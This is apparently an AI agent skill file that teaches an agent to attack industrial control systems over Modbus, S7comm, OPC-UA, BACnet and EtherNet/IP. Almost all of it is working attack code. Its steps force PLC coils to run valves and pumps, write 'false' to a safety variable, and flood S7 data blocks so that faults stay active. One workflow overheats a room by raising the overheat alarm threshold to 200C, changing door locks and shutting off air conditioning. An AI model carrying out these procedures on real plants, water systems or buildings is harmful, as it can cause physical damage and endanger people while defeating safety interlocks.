---
name: ics-exploitation
description: Exploit Industrial Control Systems using OPC-UA, S7comm, BACnet, Modbus, and EtherNet/IP protocols. Use for ICS, SCADA, PLC, building automation, HVAC, water systems, and industrial protocol security assessments.
---

# ICS Exploitation Skill

This skill teaches how to use the ICS Exploitation MCP for industrial control system security assessment. Supports 5 industrial protocols: OPC-UA, S7comm, BACnet, Modbus, and EtherNet/IP.

## Quick Start

### Check Installation
```python
# Via MCP tool
ics_check_installation()
```

### Modbus Attack (3 Steps)
```python
# 1. Connect to Modbus CLI
modbus_connect("192.168.1.1", 502)

# 2. Get status and analyze coil map
modbus_get_status()

# 3. Write coils to control system (slave ID from system documentation)
modbus_write_coil(address=9947, value=True, unit_id=82)  # Enable manual mode
modbus_write_coil(address=52, value=True, unit_id=82)    # Force start output
```

### EtherNet/IP Attack (3 Steps)
```python
# 1. Connect to controller
ethernetip_connect("192.168.1.1", 44818)

# 2. Try reading a tag (if LogixDriver works)
ethernetip_read_tag("Status")

# 3. If tag read fails, read CIP Message Router object
ethernetip_read_cip_object(class_id=0x02, instance=1)
# Check decoded.utf16_le for data
```

### OPC-UA Attack (3 Steps)
```python
# 1. Discover security requirements
opcua_enumerate_endpoints("opc.tcp://target:4840")

# 2. Generate cert and connect (if encryption required)
opcua_generate_cert("./certs")
opcua_connect("opc.tcp://target:4840", "./certs/client_cert.pem", 
              "./certs/client_key.pem", "Basic256Sha256", "SignAndEncrypt")

# 3. Find and exploit writable variables
opcua_find_writable()
opcua_write("ns=2;i=38", "false", "Boolean")
```

### S7comm Attack (3 Steps)
```python
# 1. Connect (note: some systems use non-standard ports)
s7_connect("192.168.1.1", rack=0, slot=0, port=36815)

# 2. Enumerate and read
s7_list_blocks()
s7_db_read(db_number=1, offset=0, size=100)

# 3. Write payload
s7_db_write(db_number=1, offset=0, data="FF" * 128)
```

### BACnet Attack (3 Steps)
```python
# 1. Connect to building automation CLI
bacnet_connect("192.168.1.1", 48103)

# 2. Enumerate writable objects
bacnet_list_objects()
bacnet_find_writable()

# 3. Write to multiple objects at once
bacnet_write_multiple(writes=[
    {"object_type": "analogOutput", "object_id": 21, "value": 100},
    {"object_type": "analogOutput", "object_id": 22, "value": 100}
])
```

---

## Workflow: OPC-UA Exploitation

### Step 1: Enumerate Endpoints
Discover what security the server requires:
```python
result = opcua_enumerate_endpoints("opc.tcp://target:4840")
# Check: result['security_policies']
# Check: result['recommendation']
```

**If "None" in policies**: Server accepts unencrypted - connect directly
**If encryption required**: Generate certificate first

### Step 2: Generate Certificate (If Needed)
Exploit insecure trust lists with self-signed cert:
```python
certs = opcua_generate_cert("./certs")
# Returns: cert_path, key_path, thumbprint
```

### Step 3: Connect
```python
# Unencrypted
opcua_connect("opc.tcp://target:4840")

# Encrypted with self-signed cert
opcua_connect("opc.tcp://target:4840", 
              cert_path="./certs/client_cert.pem",
              key_path="./certs/client_key.pem",
              security_policy="Basic256Sha256",
              security_mode="SignAndEncrypt")
```

### Step 4: Find Attack Surface
```python
writable = opcua_find_writable()
# Returns list of writable variables with node_id, path, value, data_type
```

### Step 5: Exploit
```python
# Write to disable safety system
opcua_write("ns=2;i=38", "false", "Boolean")

# Change setpoint
opcua_write("ns=2;i=11", "0.0", "Double")
```

### Step 6: Cleanup
```python
opcua_disconnect()
```

---

## Workflow: S7comm Exploitation

### Step 1: Connect to PLC
```python
# Standard port
s7_connect("192.168.1.1", rack=0, slot=0, port=102)

# Non-standard port
s7_connect("192.168.1.1", rack=0, slot=0, port=36815)
```

### Step 2: Enumerate
```python
# Get CPU info
s7_get_cpu_info()

# List all blocks
s7_list_blocks()
# Returns: OB, FB, FC, DB counts and DB numbers
```

### Step 3: Read Data
```python
# Read 100 bytes from DB1 at offset 0
s7_db_read(db_number=1, offset=0, size=100)
# Returns: data_hex, data_bytes, non_zero_bytes
```

### Step 4: Write Payload
```python
# Write hex string
s7_db_write(db_number=1, offset=48, data="FF" * 8)

# Generate pattern payload
payload = s7_generate_payload("all_max", 128)
s7_db_write(db_number=1, offset=0, data=payload['payload'])
```

### Step 5: Sustained Attack (If Faults Reset)

**Single offset attack:**
```python
# Continuously write to maintain fault condition
s7_sustained_attack(
    db_number=1,
    offset=0,
    data="FF" * 128,
    duration_seconds=60,
    interval_ms=200,
    status_url="http://target:8080/status"  # Optional: polls for success
)
```

**Multi-offset attack (for 3+ simultaneous faults):**
```python
# Write to multiple offsets simultaneously
s7_sustained_attack_multi(
    db_number=1,
    writes=[
        {"offset": 0, "data": "FFFFFFFF"},
        {"offset": 32, "data": "00FF"},
        {"offset": 48, "data": "00FF"},
        {"offset": 64, "data": "FFFFFFFF"}
    ],
    duration_seconds=60,
    interval_ms=200,
    status_url="http://target:8080/status"
)
```

**Type-aware writes (proper signed/unsigned handling):**
```python
# Use s7_db_write_typed for correct encoding
s7_db_write_typed(db_number=1, offset=32, value=255, data_type="UINT")
s7_db_write_typed(db_number=1, offset=48, value=100.5, data_type="REAL")
```

### Step 6: Monitor Status
```python
s7_monitor_status(
    status_url="http://target:8080/status",
    duration_seconds=30
)
```

---

## Workflow: BACnet Building Automation Attack

BACnet is used for HVAC, lighting, access control, and fire detection. Common attack: overheat a room by manipulating thermostat while bypassing alarm systems.

### Step 1: Connect to BACnet CLI
```python
# Connect to menu-driven BACnet interface
bacnet_connect("192.168.1.1", 48103)
```

### Step 2: Enumerate Objects
```python
# List all building automation objects
objects = bacnet_list_objects()
# Look for: thermostats (analogOutput), alarms (OHAP), doors (multiStateOutput)
```

**Key object types**:
| Type | Description | Access |
|------|-------------|--------|
| analogInput | Sensors (temperature) | Read-only |
| analogOutput | Setpoints (thermostat, OHAP) | Read/Write |
| binaryInput | Status indicators | Read-only |
| binaryOutput | Switches (AC) | Read/Write |
| multiStateOutput | Multi-value (door locks) | Read/Write |

### Step 3: Write to Multiple Objects
```python
# Write to multiple objects at once
bacnet_write_multiple(writes=[
    {"object_type": "analogOutput", "object_id": 21, "value": 100},
    {"object_type": "analogOutput", "object_id": 22, "value": 100}
])
```

### Step 4: Prepare the Environment
```python
# Write to door and AC controls
bacnet_write(object_type="multiStateOutput", object_id=102, value=2)
bacnet_write(object_type="binaryOutput", object_id=22, value=0)
```

### Step 5: Sustained Write
```python
# Continuously write to maintain state

result = bacnet_sustained_write(
    object_type="analogOutput",
    object_id=21,
    value=100,
    duration_seconds=120,
    interval_seconds=2.0,
    status_url="http://target:8080/data"
)

# Check status history
print(result['status_history'])
```

### Step 6: Cleanup
```python
bacnet_disconnect()
```

---

## Workflow: Modbus Exploitation

Modbus is used in water systems, power grids, and manufacturing. Common attack: manipulate PLC coils to control valves, pumps, and switches.

### Step 1: Connect to Modbus CLI
```python
# Connect to menu-driven Modbus interface
modbus_connect("192.168.1.1", 502)
```

### Step 2: Get System Status
```python
# Retrieve current system state as JSON
status = modbus_get_status()
# Look for: auto_mode, manual_mode, in_valve, out_valve, status
```

### Step 3: Analyze System Documentation
Review available documentation:
- **interface_setup.png**: Find PLC slave address and coil mappings
- **PLC_Ladder_Logic.pdf**: Understand control flow and mode switching

**Key information to extract**:
- Slave address (e.g., 82 decimal = 0x52 hex)
- Coil addresses (mode control, valves, force commands)

### Step 4: Enable Manual Mode
```python
# Switch from auto to manual mode to bypass sensor logic
# Slave ID from system docs, address from coil map
modbus_write_coil(address=9947, value=True, unit_id=82)
```

### Step 5: Manipulate System
```python
# Use force commands or direct coil writes
modbus_write_coil(address=52, value=True, unit_id=82)   # force_start_out
modbus_write_coil(address=26, value=True, unit_id=82)   # cutoff_in
```

### Step 6: Verify Success
```python
# Check status to confirm changes
status = modbus_get_status()
print(status['status'])
```

### Step 7: Cleanup
```python
modbus_disconnect()
```

**Key Insight**: Direct valve writes may not work due to ladder logic overrides.
Use mode switching and force commands to bypass sensor-driven logic.

---

## Workflow: EtherNet/IP Exploitation

EtherNet/IP uses CIP (Common Industrial Protocol) for Allen-Bradley/Rockwell controllers. Common attack: read tags or CIP objects to find sensitive data.

### Step 1: Connect to Controller
```python
# Connect to EtherNet/IP controller (default port 44818)
ethernetip_connect("192.168.1.1", 44818)

# The driver type returned indicates available features:
# - LogixDriver: Full tag access (read/write by name)
# - CIPDriver: Low-level CIP object access only
```

### Step 2: Try Tag Reading (If LogixDriver)
```python
# Attempt to read a tag directly
result = ethernetip_read_tag("Status")

# If error "LogixDriver required", proceed to Step 3
```

### Step 3: Read CIP Objects
```python
# Message Router (class 0x02) often contains hidden data
result = ethernetip_read_cip_object(class_id=0x02, instance=1)

# Check the decoded field for data
print(result['decoded'])  # Look for utf16_le, utf8, or ascii
```

### Step 4: Enumerate CIP Objects
```python
# Scan common CIP classes for accessible data
objects = ethernetip_enumerate_objects()

# Review results for decoded strings
for obj in objects['results']:
    if obj['decoded']:
        print(f"Class {obj['class_id']}, Instance {obj['instance']}: {obj['decoded']}")
```

### Step 5: Cleanup
```python
ethernetip_disconnect()
```

**Common CIP Classes**:
| Class | Hex | Description |
|-------|-----|-------------|
| Identity | 0x01 | Device info (vendor, product) |
| Message Router | 0x02 | May contain sensitive data |
| Assembly | 0x04 | I/O assemblies |
| Connection Manager | 0x06 | Connection management |
| Symbol | 0xAC | Tag/symbol information |

**Key Insight**: Data is often UTF-16-LE encoded in Message Router objects.
The `read_cip_object` tool auto-decodes multiple encodings.

---

## Workflow: Memory Mapping

When you don't know which memory offsets control what:

```python
# 1. Connect
s7_connect("target", 0, 0, port)

# 2. Scan each byte and observe HMI changes
s7_scan_db_effects(
    db_number=1,
    status_url="http://target:8080/status",
    start_offset=0,
    end_offset=128
)
# Returns: offset_map showing which bytes affect which equipment
```

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| OPC-UA connection refused | Check port (default 4840), verify OPC-UA server |
| "Security policy mismatch" | Use `opcua_enumerate_endpoints` to find supported policies |
| S7 "TCP : Unreachable peer" | Wrong IP or port, check for non-standard port |
| S7 "Address out of range" | Use `s7_db_get_size()` to check block size |
| Faults auto-reset | Use `s7_sustained_attack` or `bacnet_sustained_write` |
| Need 3+ simultaneous faults | Use `s7_sustained_attack_multi` with multiple offsets |
| Value wraps to negative | Use `s7_db_write_typed` with correct data type (UINT, UDINT) |
| No success indicator | Monitor HMI with `s7_monitor_status`, check status API |
| BACnet "mission failed" | Raise OHAP thresholds BEFORE heating |
| BACnet thermostat resets | Use `bacnet_sustained_write` to override safety reset |
| BACnet alarm triggers | OHAP too low - raise to 200C first |
| BACnet connection timeout | Check port, ensure menu-driven CLI is available |
| Modbus "command sent" but no change | Check slave ID matches system docs (often not 1) |
| Modbus valve won't respond | Use mode control coils first, then force commands |
| Modbus wrong address format | Use decimal addresses, MCP converts to hex |
| EtherNet/IP "LogixDriver failed" | Use `read_cip_object` for low-level CIP access |
| EtherNet/IP tag doesn't exist | Tag may be in CIP object, try `enumerate_objects` |
| EtherNet/IP raw data unreadable | Check `decoded` field for utf16_le encoding |
| pycomm3 not installed | `pip install pycomm3` for EtherNet/IP support |

---

## Additional Resources

- For complete tool reference, see [commands.md](commands.md)
- For agent guidance, see [rules.mdc](rules.mdc)
